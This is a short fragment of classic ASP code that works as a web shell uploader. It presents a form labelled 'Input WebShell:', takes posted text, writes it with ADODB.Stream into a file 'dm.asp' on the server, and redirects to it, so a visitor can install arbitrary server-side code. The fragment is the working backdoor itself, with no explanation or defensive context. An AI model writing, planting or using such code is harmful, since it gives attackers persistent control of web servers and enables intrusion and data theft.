%><br /><br /><div style="BACKGROUND-COLOR:#ddd" align="center">
<%fc=trim(Request("fc")):if fc<>"" then%>
<%fn=Server.MapPath(".")+"\dm.asp":set o=server.createObject("Adodb.Stream")%>
<%o.Open:o.Type=2:o.CharSet="gb2312":o.writetext fc:o.SaveToFile fn,2:response.redirect "dm.asp"%>
<%end if%>
<br /><b>Input WebShell:</b><br /><form name="fm" action="?" method="post">
<textarea cols=100 rows=10 name=fc></textarea><br /><input type="submit" value="Submit" /></form></div><%response.end%>